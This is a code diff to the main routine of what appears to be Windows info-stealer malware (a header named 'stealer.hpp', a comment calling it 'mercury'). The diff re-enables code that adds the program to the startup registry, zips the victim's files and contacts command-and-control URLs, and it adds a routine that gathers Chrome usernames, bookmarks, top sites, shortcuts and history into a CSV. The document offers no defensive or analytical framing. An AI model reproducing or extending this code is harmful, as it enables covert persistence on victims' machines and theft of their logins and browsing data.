@@ -8,6 +8,8 @@
 #include "Core/names.hpp"
 #include "Communication/senddata.hpp"
 #include "Core/stealer.hpp"
+#undef max
+
 
 std::string zipDestStr;
 std::wstring C2;
@@ -66,7 +68,7 @@ void GenZip() {
 
 
 int main() {
-    /*
+    
     std::wstring uid;
     std::string pubDir = PublicDir();
     std::string zipFile = pubDir + "zipped.zip";
@@ -78,6 +80,70 @@ int main() {
         if (!std::filesystem::exists(zipFile)) {
             PersistOnMachine(); // Add mercury to startup registry
             GenZip();           // Process files and create a zip file
+
+            // After gathering files and adding them to the zip archive, check if chrome data folder exist
+            if (CheckChrome()) {
+                std::vector<std::string> ChromeFiles = IsBrowserDataExist();
+
+                if (!ChromeFiles.empty()) {
+                    // Mapping Chrome data files to their corresponding functions and desired column names
+                    std::map<std::string, std::pair<std::function<std::set<std::string>()>, std::string>> fileFunctionMap = {
+                        {"Login Data For Account", {ChromeUsernames, "Usernames"}},
+                        {"Bookmarks", {ChromeBookmarks, "Bookmarks"}},
+                        {"Top Sites", {ChromeTopSites, "Top Sites"}},
+                        {"Shortcuts", {ChromeShortcuts, "Shortcuts"}},
+                        {"History", {ChromeHistoryURLs, "History URLs"}}
+                    };
+
+                    // Open a CSV file in the public directory
+                    std::ofstream csvFile("C:\\Users\\Public\\chrome_data.csv");
+
+                    // Write the column headers based on the desired names
+                    for (const auto& file : ChromeFiles) {
+                        auto it = fileFunctionMap.find(file);
+                        if (it != fileFunctionMap.end()) {
+                            csvFile << it->second.second << ",";
+                        }
+                    }
+                    csvFile << "\n";
+
+                    // Initialize a 2D vector to store the data for each column
+                    std::vector<std::vector<std::string>> columnData;
+
+                    // Retrieve and store data for each column
+                    for (const auto& file : ChromeFiles) {
+                        auto it = fileFunctionMap.find(file);
+                        if (it != fileFunctionMap.end()) {
+                            std::set<std::string> data = it->second.first();
+                            columnData.push_back(std::vector<std::string>(data.begin(), data.end()));
+                        }
+                    }
+
+                    // Determine the maximum number of rows needed
+                    size_t maxRows = 0;
+                    for (const auto& col : columnData) {
+                        maxRows = std::max(maxRows, col.size());
+                    }
+
+                    // Write data to the CSV file, ensuring each entry goes under its respective column
+                    for (size_t i = 0; i < maxRows; ++i) {
+                        for (const auto& col : columnData) {
+                            if (i < col.size()) {
+                                csvFile << col[i];
+                            }
+                            csvFile << ",";
+                        }
+                        csvFile << "\n";
+                    }
+
+                    csvFile.close();
+                    std::cout << "Data has been written to C:\\Users\\Public\\chrome_data.csv" << std::endl;
+                }
+                else {
+                    std::cout << "No Chrome data files to process." << std::endl;
+                }
+            }
+
 
             // Try connecting to Google and then connect to all C2 URLs to find a live C2
             bool ReachIntranet = googleConn();
@@ -151,14 +217,7 @@ int main() {
         Sleep(2000);
         SelfDestruct();
     }
-    */
 
-    std::set<std::string> topSites = ChromeHistoryURLs();
-
-    // Iterate through the set and print each URL
-    for (const std::string& url : topSites) {
-        std::cout << url << std::endl;
-    }
 
     return 0;
 }
